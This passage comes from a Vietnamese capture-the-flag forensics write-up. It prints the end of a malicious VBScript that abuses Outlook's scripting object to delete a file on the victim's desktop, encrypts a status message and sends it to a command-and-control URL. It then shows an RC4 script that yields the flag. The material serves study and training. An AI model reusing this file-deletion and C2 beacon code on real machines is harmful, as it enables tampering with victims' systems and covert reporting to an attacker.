	On error resume next
	Set fs = window.external.OutlookApplication.CreateObject("Scripting.FileSystemObject")
    If fs.FileExists("C:\Users\BKISC\Desktop\flag.py") = True Then
        fs.DeleteFile "C:\Users\BKISC\Desktop\flag.py"
	End If

	If fs.FileExists("C:\Users\BKISC\Desktop\flag.py") = True Then
		delete_file = delete_file & "Delete file: " & "C:\Users\BKISC\Desktop\flag.py" & " - Fail"
	else
		delete_file = delete_file & "Delete file: " & "C:\Users\BKISC\Desktop\flag.py" & " - Success!"
	End If
End Function
Ohm = ""
Ohm = crypthelper(delete_file(), ay, True)
rul = requestpage("http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ", chr(34) & Ohm & chr(34))
```

Giờ mình sẽ có được file flag.py bên trong nó là:

```
# Just run the code to get the flag lol

def RC4(key : bytes, plaintext : bytes):
    S = list(range(256))
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]  

    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)

    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```
Thực hiện encrypt cái plaintext bằng key `lookalikechicken` bằng thuật toán RC4 để có được flag

**flag: BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}**


